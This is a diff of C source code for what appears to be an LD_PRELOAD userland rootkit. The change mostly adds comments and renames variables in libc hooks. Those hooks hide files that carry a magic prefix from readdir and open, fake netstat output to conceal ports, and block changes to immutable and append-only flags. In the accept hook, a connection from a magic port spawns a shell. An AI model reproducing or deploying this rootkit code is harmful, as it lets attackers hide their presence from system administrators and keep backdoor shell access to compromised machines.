@@ -54,17 +54,19 @@ struct dirent *readdir(DIR *dirp)
     }
 
     char filename[PATH_MAX];
-    int i;
-    for (i = 0; dir->d_name[i] != '\0'; i++){
-        filename[i] = dir->d_name[i];
+    int fn_size;
+    // take the filename and removes grabage chars after \0
+    for (fn_size = 0; dir->d_name[fn_size] != '\0'; fn_size++){
+        filename[fn_size] = dir->d_name[fn_size];
     }
-    filename[i] = '\0';
+    filename[fn_size] = '\0';
     
     if(is_magicfile(filename)){
         #ifdef DEBUG
         printf("[+] Hiding %s\n",filename);
         #endif
-        for (int x = 0; x <= i; x++){
+        // clean the string
+        for (int x = 0; x <= fn_size; x++){
             dir->d_name[x] = '\0';
         }
         return readdir(dirp);
@@ -85,6 +87,7 @@ int open(const char *pathname, int flags, mode_t mode){
     char real_pathname[PATH_MAX];
     realpath(pathname,real_pathname);
 
+    // netstat case: hide ports
     if (is_net_file(real_pathname)){
         char newfile[PATH_MAX];
         if (!fake_netstat(real_pathname, newfile)){
@@ -92,11 +95,15 @@ int open(const char *pathname, int flags, mode_t mode){
         }
         return hooked_open(newfile, flags, mode);
     }
+
+    // killswitch case: don't touch
     #ifdef KILLSWITCH
     else if (strcmp(real_pathname, KILLSWITCH) == 0){
         return hooked_open(real_pathname, flags, mode);
     }
     #endif
+
+    // file with magic prefix
     else if (is_magicfile(real_pathname)){
         errno = ENOENT;
         return -1;
@@ -118,13 +125,17 @@ FILE *fopen(const char *pathname, const char *mode)
     char real_pathname[PATH_MAX];
     realpath(pathname,real_pathname);
 
+    // netstat case: hide ports
     if (is_net_file(real_pathname)){
         char newfile[PATH_MAX];
         if (!fake_netstat(real_pathname, newfile)){
             return NULL;
         }
         return hooked_fopen(newfile, mode);
-    } else if (is_magicfile(real_pathname)){
+    } 
+    
+    // file with magic prefix
+    if (is_magicfile(real_pathname)){
         errno = ENOENT;
         return NULL;
     }
@@ -146,13 +157,17 @@ FILE *fopen64(const char *pathname, const char *mode)
     char real_pathname[PATH_MAX];
     realpath(pathname,real_pathname);
 
+    // netstat case: hide ports
     if (is_net_file(real_pathname)){
         char newfile[PATH_MAX];
         if (!fake_netstat(real_pathname, newfile)){
             return NULL;
         }
         return hooked_fopen64(newfile, mode);
-    } else if (is_magicfile(real_pathname)){
+    }
+    
+    // file with magic prefix
+    if (is_magicfile(real_pathname)){
         errno = ENOENT;
         return NULL;
     }
@@ -167,8 +182,8 @@ int is_flag_set(int fd, unsigned long flags){
         hooked_ioctl = load_libc("ioctl");
     }
 
-    int rc = hooked_ioctl(fd, FS_IOC_GETFLAGS, &argp);
-    if (rc != -1){
+    int flag_request = hooked_ioctl(fd, FS_IOC_GETFLAGS, &argp);
+    if (flag_request != -1){
         argp = argp & flags;
         if (argp){
             return argp == flags;
@@ -187,6 +202,7 @@ int ioctl(int fd, unsigned long request, unsigned long *argp){
         hooked_ioctl = load_libc("ioctl");
     }
 
+    // +ia: immutable, append
     unsigned long flags = FS_IMMUTABLE_FL | FS_APPEND_FL;
     if (is_flag_set(fd, flags)){
         if (request == FS_IOC_SETFLAGS){
@@ -215,6 +231,8 @@ int accept(int socket, struct sockaddr_in *address, socklen_t *address_len){
         return fd;
     }
     int port = (int) ntohs(address->sin_port);
+    
+    // if connection comes from magic port spawn a shell and redirect I/O
     if (port == MAGIC_PORT){
         #ifdef DEBUG
         printf("[+] port hooked: %d, %d\n", port, fd);
